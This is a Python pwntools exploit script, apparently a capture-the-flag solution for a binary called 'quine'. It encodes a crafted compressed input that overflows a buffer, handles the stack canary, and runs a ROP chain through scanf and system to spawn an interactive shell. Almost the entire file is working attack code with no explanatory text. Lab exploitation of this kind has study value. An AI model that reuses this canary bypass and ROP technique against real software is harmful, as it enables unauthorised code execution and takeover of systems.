from pwn import *
from struct import pack, unpack


def go(s, test):
  if not test:
    sock = process("./quine")
  else:
    sock = process(["/home/zekun/pin/pin", "-t", "/home/zekun/safe-canary.so", "--", "./quine"], level='debug')
  sock.sendline(str(len(s) * 2))
  sock.sendline(s.encode('hex'))
  sock.recvuntil('Hex input: ')
  sock.recvuntil("AAAAAAAAAAAA\n")

  command = unpack('I', 'sh\0\0')[0]  # uint for scanf("%u")
  sock.sendline(str(command))

  sock.interactive()

A = []

def bit(x):
  assert x in [0, 1]
  A.append(x)

def nibble(x):
  for i in xrange(4):
    bit((x >> (3-i)) & 1)

def byte(x):
  nibble(x >> 4)
  nibble(x & 15)

def nibbles(x):
  while x:
    bit(1)
    nibble(x & 15)
    x >>= 4
  bit(0)

def literal(c):
  bit(1)
  byte(c)

def copy(off, count):
  bit(0)
  bit(1)
  nibbles(off)
  nibbles(count)

def convert(A):
  while len(A) % 8 != 0:
    A.append(0)

  s = ''
  for i in xrange(0, len(A), 8):
    c = 0
    for b in xrange(8):
      c |= A[i+b] << b
    s += chr(c)
  return s

#
## ROP
#

FGETS = 0x080486c0  # unused
STDIN = 0x0804b060  # unused
SCANF = 0x08048700
SYSTEM = 0x080486a0
EXIT = 0x08048790
FMT = 0x0804901b  # "%u"
BUF = 0x0804b100  # something writeable
BUMP_ESP = 0x0804864e  # add esp, 0x08 ; pop ebx ; ret  ;

ROP = ''
ROP += pack('IIII', SCANF, BUMP_ESP, FMT, BUF) + "ABCD"
ROP += pack('III', SYSTEM, EXIT, BUF)
ROP += pack('II', 0, 0)
ROP = ROP.ljust(170, '\0')
ROP = ROP.ljust(200, 'A')

#
## Smasher
#

A = [1] * 28
literal(0x41)
literal(0x42)
literal(0x43)
literal(0x44)

# n=2639

copy(2000, 1024*3 - 2639)

# n=3072
copy(2048, 2048)
copy(4096, 3072)
# n=8192

literal(0x41)

copy(0xffffffff, 4)  # canary
skip = 12
for i in xrange(skip):
  literal(0x43)
copy(8192+4+skip, 200)  # rop


A += [0] * 2
CODE = convert(A).ljust(200)
A = []

#
## end of smasher
#

for c in ROP + CODE:
  literal(ord(c))

literal(0)

for i in xrange(11):
  i = 2**i
  copy(i-1, i)

for i in xrange(3):
  literal(0x41)
copy(255, 80)

copy(2541-202, 100)

print len(A) / 8, len(A) % 8

go(convert(A), 1)
#for test in range(2):
#  go(convert(A), test)

    
